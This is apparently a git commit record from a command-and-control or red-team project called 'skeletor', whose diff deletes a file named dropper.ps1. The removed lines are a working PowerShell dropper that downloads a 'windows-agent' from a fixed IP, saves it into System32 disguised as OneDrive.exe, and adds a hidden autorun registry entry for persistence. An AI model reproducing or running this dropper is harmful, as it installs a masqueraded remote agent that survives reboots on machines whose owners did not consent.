77b8a40022648d9e1eac119b23941b8cb575e385
bcvillano <bvillano05@gmail.com>
2026-02-25 23:35:18 -0500

    Added skeletor binaries and moved all files to be hosted on skeletor to files dir

--- dropper.ps1
+++
@@ -1,3 +0,0 @@
-$IP = "192.168.1.1"
-Invoke-WebRequest -Uri http://$IP/download/windows-agent -Outfile "C:\Windows\System32\OneDrive.exe"
-Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "OneDrive" -Value "PowerShell.exe -WindowStyle hidden C:\Windows\System32\OneDrive.exe" -PropertyType String
